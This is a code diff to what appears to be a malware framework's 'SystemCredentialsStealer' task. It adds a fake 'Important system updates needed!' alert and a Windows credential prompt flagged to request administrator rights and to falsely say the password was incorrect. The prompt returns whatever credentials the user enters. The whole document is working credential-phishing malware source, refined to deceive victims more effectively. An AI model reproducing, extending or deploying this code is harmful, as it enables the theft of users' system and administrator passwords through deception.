@@ -1,7 +1,5 @@
 from tasks.__task import Task
-from utils import threaded_task
 from modules.notifier import Notifier
-
 
 NOTIFICATIONS = {"update": {"title": "Important system updates needed!",
                             "description": "Your system version is outdated and this PC won't "
@@ -22,9 +20,16 @@ class MethodCredUI:
 
     def run(self):
         import os
-        from win32cred import CRED_TYPE_GENERIC, CredUIPromptForCredentials
+        from win32cred import (CredUIPromptForCredentials, CREDUI_FLAGS_DO_NOT_PERSIST,
+                               CREDUI_FLAGS_REQUEST_ADMINISTRATOR, CREDUI_FLAGS_VALIDATE_USERNAME,
+                               CREDUI_FLAGS_INCORRECT_PASSWORD)
+
+        flags = (CREDUI_FLAGS_REQUEST_ADMINISTRATOR
+                 | CREDUI_FLAGS_VALIDATE_USERNAME
+                 | CREDUI_FLAGS_INCORRECT_PASSWORD
+                 | CREDUI_FLAGS_DO_NOT_PERSIST)
         creds = CredUIPromptForCredentials(os.environ['userdomain'], 0, os.environ['username'], None, True,
-                                           CRED_TYPE_GENERIC, {})
+                                           flags, {})
         return "User credentials: {}".format(creds)
 
 
@@ -40,8 +45,7 @@ class SystemCredentialsStealer(Task):
         self._logger = logging.getLogger(self.__class__.__name__)
         self.methods = [MethodCredUI]
 
-    @threaded_task
-    def start(self):
+    def run(self):
         from time import sleep
         from infos import administrator, platform
 
